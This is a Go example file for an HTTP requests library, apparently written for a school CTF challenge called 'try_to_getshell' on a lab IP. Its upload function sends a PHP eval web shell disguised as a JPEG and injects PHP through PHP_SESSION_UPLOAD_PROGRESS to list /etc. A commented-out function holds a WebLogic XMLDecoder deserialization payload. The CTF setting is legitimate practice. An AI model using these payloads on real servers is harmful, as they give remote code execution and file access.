package main

import (
	"fmt"
	"github.com/penson233/Grequests/tools/RequestsTools"
)

//GET请求
func Get() {

	//添加代理或响应头
	var headers map[string]string
	var proxies map[string]string
	var param map[string]string

	headers=make(map[string]string,1)
	proxies=make(map[string]string,1)
	param=make(map[string]string,1)

	headers["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
	proxies["http"]="http://127.0.0.1:8080"
	param["id"]="1 &1"
	param["name"]="2"

	//请求初始化
	requests:=&RequestsTools.Requests{
		Url :"http://10.1.5.252",
		Headers : headers,
		Proxies: proxies,
		Params:  param,//get参数
	}
	fmt.Println(requests.Get())
}
//post请求
func POSTdata() {


	var headers map[string]string
	var proxies map[string]string

	headers=make(map[string]string,1)
	proxies=make(map[string]string,1)

	data:="id=1&name=2"

	headers["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
	proxies["http"]="http://127.0.0.1:8080"

	requests:=&RequestsTools.Requests{
		Url: "http://10.1.5.252:27003/login.php",
		Data: data,
		Headers: headers,
		Proxies: proxies,
	}
	fmt.Println(requests.Post())
}

//传入json
func Postjson(){

	var headers map[string]string
	var proxies map[string]string
	headers=make(map[string]string,1)
	proxies=make(map[string]string,1)
	data :="{\"test\":\"penson\"}"
	headers["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"


	proxies["http"]="http://127.0.0.1:8080"

	requests:=&RequestsTools.Requests{
		Url: "http://10.1.5.252/challenges#[%E6%A0%A1%E8%B5%9B2021]try_to_getshell",
		Json: data,
		Headers: headers,
		Proxies: proxies,
	}
	fmt.Println(requests.Post())
}
//func PostXML(){
//	var headers map[string]string
//	var proxies map[string]string
//	headers=make(map[string]string,1)
//	proxies=make(map[string]string,1)
//	data:="<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n      <soapenv:Header>\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n         <java version=\"1.6.0\" class=\"java.beans.XMLDecoder\">\n                    <object class=\"java.io.PrintWriter\"> \n                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt</string><void method=\"println\">\n                        <string>vul_test</string></void><void method=\"close\"/>\n                    </object>\n            </java>\n        </work:WorkContext>\n      </soapenv:Header>\n      <soapenv:Body/>\n</soapenv:Envelope>"
//
//	headers["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
//	headers["Content-Type"]="text/xml"
//
//	proxies["http"]="http://127.0.0.1:8080"
//
//	requests:=&RequestsTools.Requests{
//		Url: "http://10.1.5.252/challenges#[%E6%A0%A1%E8%B5%9B2021]try_to_getshell",
//		Data: data,
//		Headers: headers,
//		Proxies: proxies,
//	}
//	fmt.Println(requests.Post())
//}

//上传文件
func UploadFile() {
	var headers map[string]string
	var proxies map[string]string
	var mutidata map[string]string

	headers=make(map[string]string,1)
	proxies=make(map[string]string,1)
	mutidata=make(map[string]string,1)


	file:=[]string{"file","1.php","<?php eval($_POST['penson'])?>","image/jpeg"}

	headers["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
	//headers["Content-Type"]="text/xml"
	mutidata["PHP_SESSION_UPLOAD_PROGRESS"]="<?php $a=new DirectoryIterator(\"glob:///etc/*\");foreach($a as $f){echo($f->__toString().\\' \\');}exit(0);?>"

	proxies["http"]="http://127.0.0.1:8080"

	requests:=&RequestsTools.Requests{
		Url: "http://10.1.5.252/challenges#[%E6%A0%A1%E8%B5%9B2021]try_to_getshell",
		Headers: headers,
		Proxies: proxies,
		File: file,
		MutiData: mutidata,
	}
	fmt.Println(requests.Post())
}

func main() {
	//get请求
	//Get()
	//post请求
	//POSTdata()
	//Postjson()
	//PostXML()
	UploadFile()

}